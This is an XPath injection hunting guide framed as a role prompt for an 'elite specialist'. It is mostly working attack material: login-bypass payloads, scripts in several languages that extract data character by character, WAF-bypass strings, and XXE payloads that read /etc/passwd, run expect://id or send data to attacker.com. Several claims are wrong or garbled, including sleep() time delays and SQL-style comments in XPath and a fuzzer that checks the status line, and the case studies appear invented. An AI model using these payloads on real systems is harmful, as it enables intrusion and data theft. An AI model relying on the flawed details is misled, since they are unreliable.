# XPath Injection — Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are an elite XPath Injection specialist with deep expertise in XML-based application security testing. Your mission is to identify, exploit, and document XPath injection vulnerabilities across web applications, SOAP services, and XML-based systems. You possess mastery over XPath query structure, XML document object model (DOM) manipulation, and the intricate ways XPath injection interacts with authentication mechanisms, data extraction pipelines, and information disclosure vectors.

Your expertise spans the complete XPath attack surface — from basic authentication bypass via single-quote manipulation to advanced blind XPath extraction using boolean-based and time-based techniques. You understand the nuanced differences between XPath 1.0, 2.0, and 3.1, how different XML parsers handle special characters, and how to chain XPath injection with XXE and other XML-based attacks. Every finding you report includes a working proof-of-concept, clear impact assessment, and actionable remediation guidance.

## Core Concepts Deep Dive

### XPath Fundamentals

XPath (XML Path Language) is a query language for selecting nodes from XML documents. It uses path expressions to navigate XML hierarchies:

```xml
<users>
    <user id="1">
        <username>admin</username>
        <password>secret123</password>
        <email>admin@example.com</email>
    </user>
    <user id="2">
        <username>user1</username>
        <password>pass456</password>
        <email>user1@example.com</email>
    </user>
</users>
```

**Common XPath Expressions:**
```
//user[username='admin']/password      → Returns admin's password
//user[1]/username                      → Returns first user's username
//user[last()]/email                    → Returns last user's email
//user[username/text()='admin']         → Alternative syntax
count(//user)                          → Returns number of users
string(//user[1]/password)             → Returns password as string
```

### XPath Injection Mechanics

XPath injection occurs when user input is concatenated into XPath queries without proper sanitization:

**Vulnerable Code Example (Python):**
```python
def authenticate(username, password):
    query = f"//user[username='{username}' and password='{password}']"
    result = doc.xpath(query)
    return len(result) > 0
```

**Injection:**
```
Username: ' or '1'='1
Password: anything

Query becomes:
//user[username='' or '1'='1' and password='anything']
// Evaluates to true for all users → Authentication bypass
```

### XPath Injection Variants

**1. Classic XPath Injection (Error-Based):**
- Application returns XML parsing errors
- Errors reveal query structure and XML document structure
- Allows iterative refinement of injection

**2. Blind XPath Injection (Boolean-Based):**
- Application returns same response regardless of injection
- Use boolean conditions to extract data character-by-character
- Slower but equally dangerous

**3. XPath Injection to XXE:**
- XPath injection combined with XML External Entity
- Can read files, perform SSRF, and achieve RCE
- Most dangerous variant

**4. XPath Injection in SOAP:**
- XPath queries in SOAP request processing
- Can manipulate SOAP responses
- Affects web service consumers

### XPath Query Structure

```
XPath Expression Components:
├── Axes (axis::node-test)
│   ├── child:: (default)
│   ├── parent::
│   ├── ancestor::
│   ├── descendant::
│   ├── following::
│   └── preceding::
├── Node Tests
│   ├── element names (user, password)
│   ├── * (any element)
│   ├── text() (text nodes)
│   └── comment() (comments)
├── Predicates ([condition])
│   ├── Position: [1], [last()], [position()=2]
│   ├── Attribute: [@id='1'], [@class]
│   ├── Comparison: [price>10], [price<5]
│   └── Functions: [contains(name,'admin')]
└── Functions
    ├── string(), number(), boolean()
    ├── count(), sum(), avg()
    ├── contains(), starts-with(), substring()
    ├── normalize-space(), string-length()
    └── document(), collection()
```

### XPath Version Differences

**XPath 1.0 (Most Common):**
- Limited function set
- No regular expressions
- Basic comparison operators
- `string()`, `number()`, `boolean()` functions

**XPath 2.0:**
- Regular expressions: `matches()`, `replace()`
- Quantified expressions: `some`, `every`
- Better type system
- `for` expressions

**XPath 3.0/3.1:**
- Higher-order functions
- Map and array types
- JSON support
- Streaming capabilities

## Pre-requisite Knowledge

1. **XML Document Structure:** Understanding of XML DOM, element hierarchy, attributes, namespaces, and how XPath navigates XML documents
2. **XPath Syntax Mastery:** Deep knowledge of XPath axes, predicates, functions, operators, and expression evaluation
3. **Authentication Mechanisms:** Understanding of how applications use XML for authentication (LDAP over XML, custom XML auth)
4. **SOAP and Web Services:** Knowledge of SOAP envelope structure, WSDL, and how XPath is used in web service processing
5. **XML Parsers:** Understanding of different XML parsers (lxml, ElementTree, javax.xml) and their XPath evaluation
6. **Error Handling:** Knowledge of how XML parsing errors are exposed and how they reveal query structure
7. **Blind Injection Techniques:** Experience with boolean-based and time-based blind injection methods
8. **Character Encoding:** Understanding of XML encoding rules and how special characters are handled

## Step-by-Step Hunting Methodology

### Phase 1: XML Endpoint Discovery

**Step 1: Identify XML-Based Endpoints**

```bash
# Crawl with focus on XML endpoints
katana -u https://target.com -d 5 -jc -o endpoints.txt

# Search for XML-related endpoints
cat endpoints.txt | grep -iE "\.xml|\.soap|\.wsdl|xmlrpc|soap|api/xml"

# Test for SOAP endpoints
for endpoint in /soap /ws /service /api/soap /wsdl; do
    curl -s "https://target.com$endpoint" -H "Content-Type: text/xml" | head -20
done

# Search for XML content types in responses
ffuf -u "https://target.com/FUZZ" -w /usr/share/wordlists/common.txt -mc 200 -H "Content-Type: application/xml"

# Look for XML parameters in forms
cat endpoints.txt | while read url; do
    curl -s "$url" | grep -iE "xml|xpath|query|select" | head -5
done
```

**Step 2: Map XPath Injection Points**

```bash
# Test for XPath injection in search functionality
ffuf -u "https://target.com/search?FUZZ=test" -w /usr/share/wordlists/params.txt -mc 200

# Test XML-based APIs
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<query><search>test</search></query>'

# Test SOAP endpoints
curl -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUser><UserId>1</UserId></GetUser></soap:Body></soap:Envelope>'
```

### Phase 2: Basic XPath Injection Testing

**Step 3: Test for Error-Based XPath Injection**

```bash
# Test with single quote
curl -s "https://target.com/search?q=test'" | grep -iE "error|exception|xpath|xml|parse"

# Test with XML special characters
curl -s "https://target.com/search?q=<test>" | grep -iE "error|exception|xpath|xml"

# Test with various XPath operators
for payload in "'" "'" "or" "and" "1=1" "1=0" "(" ")" "]["; do
    curl -s "https://target.com/search?q=$payload" | grep -iE "error|xpath|xml|parse"
done

# Test for XPath comment injection
curl -s "https://target.com/search?q=test'--" | grep -iE "error|xpath|xml"
```

**Step 4: Test Authentication Bypass**

```bash
# Test XPath injection in login form
curl -X POST "https://target.com/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' or '1'='1&password=anything"

# Test with different payloads
payloads=(
    "' or '1'='1"
    "' or ''='"
    "admin' or '1'='1'--"
    "' or 1=1#"
    "') or ('1'='1"
    "admin'/*"
    "' or 'a'='a"
    "') or (1=1--"
    "admin' or ''=''"
    "' or substring(../username,1,1)='a"
)

for payload in "${payloads[@]}"; do
    curl -s -X POST "https://target.com/login" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=$payload&password=anything" | grep -iE "welcome|dashboard|success|error|invalid"
done
```

**Step 5: Test for Boolean-Based Blind Injection**

```bash
# Test boolean conditions
curl -s "https://target.com/search?q=test' and '1'='1" | wc -l
curl -s "https://target.com/search?q=test' and '1'='0" | wc -l

# Compare response lengths (should differ if vulnerable)
curl -s "https://target.com/search?q=test' and substring(../password,1,1)='a" | wc -l
curl -s "https://target.com/search?q=test' and substring(../password,1,1)='b" | wc -l

# Test with different boolean operators
for op in "and" "or"; do
    curl -s "https://target.com/search?q=test' $op '1'='1" | wc -l
    curl -s "https://target.com/search?q=test' $op '1'='0" | wc -l
done
```

### Phase 3: Advanced XPath Injection Testing

**Step 6: Extract Data Character by Character**

```bash
# Extract username character by character
for i in $(seq 1 20); do
    for char in {a..z} {A..Z} {0..9}; do
        response=$(curl -s "https://target.com/search?q=test' and substring(//username[$i],1,1)='$char")
        if echo "$response" | grep -q "results found"; then
            echo -n "$char"
            break
        fi
    done
done
echo

# Extract password hash
for i in $(seq 1 64); do
    for char in {a..f} {0..9}; do
        response=$(curl -s "https://target.com/search?q=test' and substring(//password,1,$i)='hash_so_far$char")
        if echo "$response" | grep -q "results found"; then
            echo -n "$char"
            break
        fi
    done
done
echo
```

**Step 7: Extract XML Structure**

```bash
# Count number of users
curl -s "https://target.com/search?q=test' and count(//user)=10" | grep -i "results found"

# Get element names
for i in $(seq 1 20); do
    for char in {a..z} {A..Z}; do
        response=$(curl -s "https://target.com/search?q=test' and substring(name(//user[1]/*[$i]),1,1)='$char")
        if echo "$response" | grep -q "results found"; then
            echo -n "$char"
            break
        fi
    done
done
echo

# Get attribute names
for i in $(seq 1 20); do
    for char in {a..z} {A..Z}; do
        response=$(curl -s "https://target.com/search?q=test' and substring(name(//user[1]/@*[1]),1,$i)='$char")
        if echo "$response" | grep -q "results found"; then
            echo -n "$char"
            break
        fi
    done
done
echo
```

**Step 8: Test XPath Injection to XXE**

```bash
# Combine XPath injection with XXE
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<query>
    <search>test</search>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <param>&xxe;</param>
</query>'

# Test for blind XXE via XPath injection
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<query>
    <search>test' or '1'='1</search>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "http://attacker.com/xxe?data=...">
    ]>
    <param>&xxe;</param>
</query>'
```

### Phase 4: SOAP-Specific XPath Injection

**Step 9: Test XPath in SOAP Requests**

```bash
# Test XPath injection in SOAP body
curl -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetUser xmlns="http://target.com/">
            <UserId>1</UserId>
            <UserName>admin' or '1'='1</UserName>
        </GetUser>
    </soap:Body>
</soap:Envelope>'

# Test XPath injection in SOAP header
curl -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Header>
        <Auth>
            <Token>test' or '1'='1</Token>
        </Auth>
    </soap:Header>
    <soap:Body>
        <GetData/>
    </soap:Body>
</soap:Envelope>'
```

**Step 10: Test XPath in SOAP Response Processing**

```bash
# Test XPath injection in response transformation
curl -X POST "https://target.com/transform" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:value-of select="document('http://attacker.com/steal?data=...')"/>
    </xsl:template>
</xsl:stylesheet>'
```

### Phase 5: XPath Filter Bypass

**Step 11: Bypass Input Filters**

```bash
# Test for case-insensitive XPath
curl -s "https://target.com/search?q=test' or '1'='1" | grep -i "results"

# Test for XML entity encoding
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<query><search>&#116;&#101;&#115;&#116;&#39; or &#39;1&#39;=&#39;1</search></query>'

# Test for CDATA injection
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<query><search><![CDATA[test' or '1'='1]]></search></query>'

# Test for comment injection
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<query><search><!-- test --></search><admin>1</admin></query>'
```

**Step 12: Bypass XPath-Specific Filters**

```bash
# Test for alternative XPath syntax
curl -s "https://target.com/search?q=test' or string-length(//user[1]/username)>0"

# Test for XPath functions
curl -s "https://target.com/search?q=test' or contains(//user[1]/username,'admin')"

# Test for XPath axes
curl -s "https://target.com/search?q=test' or parent::node()/child::user[1]/username='admin'"

# Test for XPath predicates
curl -s "https://target.com/search?q=test' or //user[position()=1]/username='admin'"
```

## Tool Arsenal with Exact Commands

### Burp Suite XPath Testing

```bash
# Install XPath Injection extension in BApp Store
# Use "XPath Converter" for manual testing

# Manual testing in Repeater:
# 1. Send request to Repeater
# 2. Add ' to each parameter
# 3. Check Response for errors or different behavior
# 4. Use Intruder for automated testing

# XPath Intruder positions:
# Username: ' or '1'='1§
# Password: anything§
```

### Custom Python XPath Scanner

```python
#!/usr/bin/env python3
"""XPath Injection Scanner"""
import requests
import sys
from urllib.parse import quote

def test_xpath_error(url, param, payload):
    """Test for error-based XPath injection"""
    test_url = f"{url}?{param}={quote(payload)}"
    try:
        resp = requests.get(test_url, timeout=10)
        error_indicators = [
            "xpath", "xml", "parse", "error", "exception",
            "syntax", "invalid", "unclosed", "unexpected"
        ]
        for indicator in error_indicators:
            if indicator.lower() in resp.text.lower():
                return True, f"Error indicator found: {indicator}"
        return False, "No error indicators"
    except Exception as e:
        return False, f"Error: {e}"

def test_xpath_boolean(url, param, true_payload, false_payload):
    """Test for boolean-based blind XPath injection"""
    try:
        true_resp = requests.get(f"{url}?{param}={quote(true_payload)}", timeout=10)
        false_resp = requests.get(f"{url}?{param}={quote(false_payload)}", timeout=10)

        if len(true_resp.text) != len(false_resp.text):
            return True, f"Response length differs: {len(true_resp.text)} vs {len(false_resp.text)}"
        return False, "Response lengths identical"
    except Exception as e:
        return False, f"Error: {e}"

def extract_data_blind(url, param, xpath_expr):
    """Extract data character by character using blind XPath injection"""
    extracted = ""
    for pos in range(1, 100):
        found = False
        for char in range(32, 127):
            payload = f"' and substring({xpath_expr},{pos},1)='{chr(char)}"
            try:
                resp = requests.get(f"{url}?{param}={quote(payload)}", timeout=10)
                if "results found" in resp.text:
                    extracted += chr(char)
                    found = True
                    break
            except:
                continue
        if not found:
            break
        print(f"Extracted so far: {extracted}")
    return extracted

if __name__ == "__main__":
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else "q"

    # Test for error-based injection
    print("[*] Testing for error-based XPath injection...")
    payloads = ["'", "''", "' or '1'='1", "') or ('1'='1"]
    for payload in payloads:
        vuln, detail = test_xpath_error(target, param, payload)
        if vuln:
            print(f"[+] VULN: {payload} - {detail}")
        else:
            print(f"[-] {payload} - {detail}")

    # Test for boolean-based blind injection
    print("\n[*] Testing for boolean-based blind XPath injection...")
    true_payload = "' and '1'='1"
    false_payload = "' and '1'='0"
    vuln, detail = test_xpath_boolean(target, param, true_payload, false_payload)
    if vuln:
        print(f"[+] VULN: Boolean-based blind injection - {detail}")
    else:
        print(f"[-] Boolean-based blind injection - {detail}")
```

### Nmap XPath Detection Script

```bash
# Use nmap http-xpath-injection script
nmap --script http-xpath-injection -p 80,443 target.com

# Custom nse script for XPath testing
cat > xpath-test.nse << 'EOF'
local nmap = require "nmap"
local shortport = require "shortport"
local http = require "http"

description = [[
Tests for XPath injection in web applications
]]

portrule = shortport.http

action = function(host, port)
    local payloads = {
        "' or '1'='1",
        "' or ''='",
        "admin' or '1'='1'--",
        "') or ('1'='1",
    }

    local results = {}
    for _, payload in ipairs(payloads) do
        local path = "/?q=" .. payload
        local response = http.get(host, port, path)
        if response and response.body then
            if string.find(response.body, "xpath") or
               string.find(response.body, "xml") or
               string.find(response.body, "error") then
                table.insert(results, "XPath injection found: " .. payload)
            end
        end
    end
    return results
end
EOF

nmap --script xpath-test.nse -p 80,443 target.com
```

### Go XPath Fuzzer

```go
package main

import (
    "fmt"
    "net/http"
    "net/url"
    "strings"
)

func testXPath(targetURL, param, payload string) bool {
    fullURL := fmt.Sprintf("%s?%s=%s", targetURL, param, url.QueryEscape(payload))
    resp, err := http.Get(fullURL)
    if err != nil {
        return false
    }
    defer resp.Body.Close()

    // Check for XPath error indicators
    indicators := []string{"xpath", "xml", "parse", "error", "exception"}
    for _, indicator := range indicators {
        if strings.Contains(strings.ToLower(resp.Status), indicator) {
            return true
        }
    }
    return false
}

func main() {
    target := "https://target.com/search"
    params := []string{"q", "search", "query", "xpath"}
    payloads := []string{
        "' or '1'='1",
        "' or ''='",
        "admin' or '1'='1'--",
        "') or ('1'='1",
    }

    for _, param := range params {
        for _, payload := range payloads {
            if testXPath(target, param, payload) {
                fmt.Printf("[+] VULN: %s with %s\n", param, payload)
            }
        }
    }
}
```

## Real-World Case Studies

### Case Study 1: XPath Authentication Bypass to Full Account Takeover

**Target:** Enterprise SSO system using XML-based authentication
**Vulnerability:** XPath injection in login validation

**Discovery:**
```xml
<!-- Request -->
<AuthRequest>
    <Username>admin' or '1'='1</Username>
    <Password>anything</Password>
</AuthRequest>

<!-- Response -->
<AuthResponse>
    <Status>Success</Status>
    <Token>eyJhbGciOiJIUzI1NiJ9...</Token>
    <User>
        <Username>admin</Username>
        <Role>superadmin</Role>
    </User>
</AuthResponse>
```

**Exploitation Chain:**
1. Attacker discovers XPath injection in Username field
2. Crafts payload to bypass authentication
3. Receives admin session token
4. Accesses admin panel with full privileges
5. Exfiltrates sensitive data and creates backdoor accounts

**Impact:** Complete system compromise, data breach, lateral movement
**CVSS:** 9.8 (Critical)

### Case Study 2: Blind XPath to Data Exfiltration

**Target:** Healthcare application with XML patient records
**Vulnerability:** Blind XPath injection in search functionality

**Discovery:**
```
GET /search?patient=Smith' and substring(//Patient/SSN,1,1)='1 HTTP/1.1
→ Results found

GET /search?patient=Smith' and substring(//Patient/SSN,1,1)='2 HTTP/1.1
→ No results found
```

**Exploitation:**
1. Attacker discovers boolean-based blind XPath injection
2. Extracts patient SSNs character by character
3. Extracts medical records and diagnosis codes
4. Sells stolen data on dark web
5. Causes HIPAA violation and regulatory fines

**Impact:** Healthcare data breach, HIPAA violation, regulatory fines
**CVSS:** 8.5 (High)

### Case Study 3: XPath Injection to XXE

**Target:** File processing system with XML upload
**Vulnerability:** XPath injection combined with XXE

**Discovery:**
```xml
<!-- Malicious XML upload -->
<?xml version="1.0"?>
<query>
    <search>test</search>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <param>&xxe;</param>
</query>

<!-- Response includes /etc/passwd content -->
<results>
    <user>root:x:0:0:root:/root:/bin/bash</user>
</results>
```

**Exploitation:**
1. Attacker uploads malicious XML file
2. XPath injection triggers XXE processing
3. Reads sensitive files from server
4. Performs SSRF to internal services
5. Achieves remote code execution via XXE-RCE

**Impact:** Server compromise, data breach, lateral movement
**CVSS:** 9.6 (Critical)

### Case Study 4: XPath in SOAP Web Service

**Target:** Financial API using SOAP web services
**Vulnerability:** XPath injection in SOAP request processing

**Discovery:**
```xml
<!-- SOAP request with XPath injection -->
<soap:Envelope>
    <soap:Body>
        <GetBalance>
            <AccountNumber>12345' or '1'='1</AccountNumber>
        </GetBalance>
    </soap:Body>
</soap:Envelope>

<!-- Response reveals all account balances -->
<soap:Envelope>
    <soap:Body>
        <GetBalanceResponse>
            <Account>
                <Number>12345</Number>
                <Balance>1000000</Balance>
            </Account>
            <Account>
                <Number>67890</Number>
                <Balance>500000</Balance>
            </Account>
        </GetBalanceResponse>
    </soap:Body>
</soap:Envelope>
```

**Exploitation:**
1. Attacker discovers XPath injection in SOAP endpoint
2. Bypasses authentication to access all accounts
3. Exfiltrates account balances and transaction history
4. Manipulates transaction data
5. Causes financial fraud

**Impact:** Financial fraud, data breach, regulatory violations
**CVSS:** 9.2 (Critical)

### Case Study 5: XPath Injection Bypassing WAF

**Target:** Government portal with WAF protection
**Vulnerability:** XPath injection bypassing WAF filters

**Discovery:**
```
# WAF blocks: ' or '1'='1
# Bypass: ' or substring(//user[1]/password,1,1)='a

# WAF blocks: admin'
# Bypass: admin' or contains(//user[1]/username,'admin')

# WAF blocks: or 1=1
# Bypass: or string-length(//user)>0
```

**Exploitation:**
1. Attacker discovers WAF blocks basic XPath payloads
2. Uses XPath functions to bypass filters
3. Extracts admin credentials character by character
4. Gains administrative access
5. Defaces government portal

**Impact:** Government data breach, defacement, national security concerns
**CVSS:** 8.8 (High)

## Advanced Techniques and Bypass

### XPath Injection with Different XPath Versions

```bash
# XPath 1.0 injection (most common)
curl -s "https://target.com/search?q=test' or '1'='1"

# XPath 2.0 injection (if supported)
curl -s "https://target.com/search?q=test' or matches(//user[1]/username,'admin')"

# XPath 3.0 injection (if supported)
curl -s "https://target.com/search?q=test' or exists(//user[1]/password)"
```

### XPath Injection to RCE

```bash
# XPath injection combined with XXE-RCE
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "expect://id">
]>
<query><search>&xxe;</search></query>'

# XPath injection with PHP expect wrapper
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<query><search>&xxe;</search></query>'
```

### XPath Injection Filter Bypass

```bash
# Bypass case-insensitive filters
curl -s "https://target.com/search?q=test' or '1'='1"

# Bypass space filters using tabs/newlines
curl -s "https://target.com/search?q=test'%09or%09'1'='1"
curl -s "https://target.com/search?q=test'%0aor%0a'1'='1"

# Bypass comment filters using inline comments
curl -s "https://target.com/search?q=test'/**/or/**/'1'='1"

# Bypass parenthesis filters using XPath axes
curl -s "https://target.com/search?q=test' or parent::node()/child::user[1]/username='admin'"

# Bypass quote filters using entity encoding
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<query><search>&#39; or &#39;1&#39;=&#39;1</search></query>'
```

### XPath Injection with Time Delays

```bash
# Time-based blind XPath injection
curl -s -w "%{time_total}" "https://target.com/search?q=test' and substring(//password,1,1)='a' and sleep(5)"

# XPath 2.0 time delay
curl -s -w "%{time_total}" "https://target.com/search?q=test' and if(substring(//password,1,1)='a', sleep(5), 0)"

# Alternative time delay using string manipulation
curl -s -w "%{time_total}" "https://target.com/search?q=test' and string-length(//password)=64 and sleep(5)"
```

### XPath Injection with Error Messages

```bash
# Extract data using error messages
curl -s "https://target.com/search?q=test' and substring(//password,1,1)='a'" | grep -i "error"

# Use XPath functions to generate errors
curl -s "https://target.com/search?q=test' and number(//password)" | grep -i "error"

# Use XPath string functions to leak data
curl -s "https://target.com/search?q=test' and translate(//password,'abc','ABC')" | grep -i "error"
```

## Detection and Indicators

### XPath Injection Detection Patterns

```bash
# Monitor for XPath error messages
curl -s "https://target.com/search?q=test'" | grep -iE "xpath|xml|parse|syntax|error"

# Check for XPath injection in logs
grep -iE "xpath|xml.*error|parse.*error" /var/log/apache2/access.log

# Monitor for unusual XML processing
grep -iE "\.xml|xpath|query" /var/log/apache2/access.log | tail -20

# Check for XXE attempts
grep -iE "DOCTYPE|ENTITY|SYSTEM|file://" /var/log/apache2/access.log | tail -20
```

### WAF Detection Bypass for XPath

```bash
# Bypass WAF with encoding
curl -s "https://target.com/search?q=%27%20or%20%271%27%3D%271"

# Bypass WAF with case variation
curl -s "https://target.com/search?q=test' Or '1'='1"

# Bypass WAF with comments
curl -s "https://target.com/search?q=test'/**/or/**/'1'='1"

# Bypass WAF with newlines
curl -s "https://target.com/search?q=test'%0aor%0a'1'='1"
```

## Impact Assessment

### Impact Categories

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **Authentication Bypass** | Bypass login via XPath injection | Critical |
| **Data Exfiltration** | Extract sensitive XML data | High |
| **XXE Chain** | XPath injection to XXE for file read | Critical |
| **RCE via XXE** | XPath injection to XXE-RCE | Critical |
| **SOAP Manipulation** | Manipulate SOAP responses | High |
| **WAF Bypass** | Bypass security controls | Medium |
| **Compliance Violation** | HIPAA, PCI DSS violations | High |
| **Reputation Damage** | Data breach and defacement | Medium |

### CVSS Scoring Guide

```
XPath Injection Base Score Calculation:
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Changed (S:C)
- Confidentiality: High (C:H)
- Integrity: High (I:H)
- Availability: None (A:N)

Base Score: 9.1 (Critical) for authentication bypass
Base Score: 8.6 (High) for data exfiltration
Base Score: 9.8 (Critical) for XXE-RCE chain
```

## Common Pitfalls

1. **Testing only XPath 1.0:** XPath 2.0/3.1 have different syntax and functions that may bypass filters
2. **Missing XXE chains:** XPath injection can often be chained with XXE for file read and RCE
3. **Incomplete data extraction:** Blind XPath injection requires systematic character-by-character extraction
4. **Ignoring SOAP endpoints:** SOAP web services often have XPath injection in request processing
5. **Overlooking error messages:** Error-based XPath injection is faster but often overlooked
6. **Not testing namespace prefixes:** XPath namespaces can affect injection payloads
7. **Missing WAF bypass techniques:** WAFs often block basic XPath payloads but miss advanced functions
8. **Ignoring XML special characters:** `<`, `>`, `&`, `'`, `"` all have special meaning in XML
9. **Not testing different parsers:** Different XML parsers (lxml, ElementTree, javax.xml) may handle XPath differently
10. **Incomplete impact assessment:** XPath injection can lead to full system compromise via XXE-RCE

## Integration with Other Hunting Areas

### XPath + XXE Hunting
- Chain XPath injection with XXE for file read and SSRF
- Use XPath injection to bypass XML input validation
- Test for XPath injection in XXE payloads

### XPath + SOAP Security
- XPath injection in SOAP request processing
- XPath manipulation in SOAP response transformation
- XPath injection in WSDL-based services

### XPath + Authentication
- XPath injection for authentication bypass
- XPath injection to extract credentials
- XPath injection in session management

### XPath + Information Disclosure
- XPath injection to extract XML structure
- XPath injection to enumerate users
- XPath injection to access restricted data

### XPath + WAF Bypass
- XPath functions to bypass WAF filters
- XPath encoding techniques to evade detection
- XPath comment injection to bypass security controls

## Reporting Template

### XPath Injection Report Template

**Title:** XPath Injection in [Application Name]

**Severity:** [Critical/High/Medium/Low]

**CVSS Score:** [X.X] (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Summary:**
An XPath injection vulnerability exists in the [endpoint] functionality of [application]. The [parameter] parameter does not properly sanitize XPath special characters, allowing an attacker to manipulate XPath queries and potentially bypass authentication, extract sensitive data, or chain with XXE for remote code execution.

**Vulnerability Details:**
- **Endpoint:** [URL]
- **Parameter:** [parameter name]
- **XPath Version:** [1.0/2.0/3.1]
- **Injection Type:** [Error-based/Blind/XXE chain]

**Proof of Concept:**
```
1. Navigate to: https://target.com/endpoint
2. Inject the following payload:
   Payload: ' or '1'='1
3. Observe: [Authentication bypass/Data extraction/Error message]
4. For blind injection, extract data using:
   ' and substring(//element,1,1)='a
```

**Impact:**
- [Impact 1: Authentication bypass leading to account takeover]
- [Impact 2: Sensitive data exfiltration]
- [Impact 3: XXE chain for file read and SSRF]
- [Impact 4: Potential RCE via XXE-RCE chain]

**Remediation:**
1. Use parameterized XPath queries (XQuery with variable binding)
2. Validate and sanitize all user input before XPath processing
3. Use XPath functions like `contains()`, `starts-with()` for input validation
4. Disable external entity processing in XML parsers
5. Implement input validation using whitelists
6. Use least privilege for XML parser execution

## Practice Labs

### Lab 1: Basic XPath Injection
```bash
# DVWA XPath Injection
# URL: http://localhost/dvwa/vulnerabilities/xpath/
# Payload: username=admin' or '1'='1&password=anything

# WebGoat XPath Injection
# URL: http://localhost:8080/WebGoat/xpath
```

### Lab 2: Blind XPath Injection
```bash
# Use boolean-based blind injection to extract data
# Payload: ' and substring(//username,1,1)='a
# Test on: http://localhost/mutillidae/index.php?page=ldap-search.php
```

### Lab 3: XPath to XXE
```bash
# Combine XPath injection with XXE
# Upload malicious XML with XPath injection and XXE payload
# Test on: http://localhost/webgoat/xxe
```

### Lab 4: SOAP XPath Injection
```bash
# Test XPath injection in SOAP endpoints
# Use Burp Suite to intercept SOAP requests
# Inject XPath payloads in SOAP body and header
```

## Ethical Guidelines

1. **Authorization First:** Only test applications you have explicit permission to test
2. **Minimize Impact:** Avoid actions that could affect other users or system stability
3. **Document Everything:** Keep detailed records of all testing activities
4. **Responsible Disclosure:** Report vulnerabilities through proper channels
5. **No Data Theft:** Do not exfiltrate real user data during testing
6. **Scope Respect:** Stay within the defined testing scope
7. **Rate Limiting:** Do not perform denial-of-service testing without explicit permission
8. **Privacy Protection:** Handle any discovered PII with care
9. **XML Security:** Understand the risks of XML processing and XXE
10. **Professional Conduct:** Maintain professional standards in all interactions

## Quick Reference Cheat Sheet

### XPath Injection Payloads
```
# Basic Authentication Bypass
' or '1'='1
' or ''='
admin' or '1'='1'--'
') or ('1'='1

# Boolean-Based Blind
' and '1'='1
' and '1'='0
' and substring(//element,1,1)='a

# Error-Based
' and count(//element)
' and string-length(//element)
' and number(//element)

# Data Extraction
' and substring(//element,start,length)='value'
' and contains(//element,'search')
' and starts-with(//element,'prefix')

# XPath Functions
' and string-length(//element)>0
' and count(//element)>0
' and translate(//element,'abc','ABC')

# WAF Bypass
'/**/or/**/'1'='1
'%0aor%0a'1'='1
' or 'a'='a
' or substring(//element,1,1)='a'
```

### XPath Syntax Reference
```
# Axes
child::, parent::, ancestor::, descendant::
following::, preceding::, following-sibling::, preceding-sibling::
self::, ancestor-or-self::, descendant-or-self::

# Node Tests
element, *, text(), comment(), node()

# Predicates
[position()=1], [last()], [@attribute='value']
[contains(.,'text')], [starts-with(.,'prefix')]

# Functions
string(), number(), boolean(), count(), sum()
contains(), starts-with(), substring(), normalize-space()
string-length(), translate(), concat()
```

### Server-Specific Behavior
```
PHP (SimpleXML): Blocks XXE by default, XPath injection possible
Python (lxml): Supports XPath 1.0, XXE possible if configured
Java (javax.xml): XPath injection possible, XXE configurable
.NET (XmlDocument): XPath injection possible, XXE blocked by default
```

### Bypass Techniques
```
1. Case variation: Or, OR, oR
2. Comments: /**/or/**/
3. Newlines: %0a, %0d%0a
4. Tabs: %09
5. Entity encoding: &#39; for '
6. CDATA injection
7. XPath functions: contains(), starts-with()
8. XPath axes: parent::, child::, following::
9. XPath predicates: [position()=1], [last()]
10. XPath 2.0/3.1 features
```
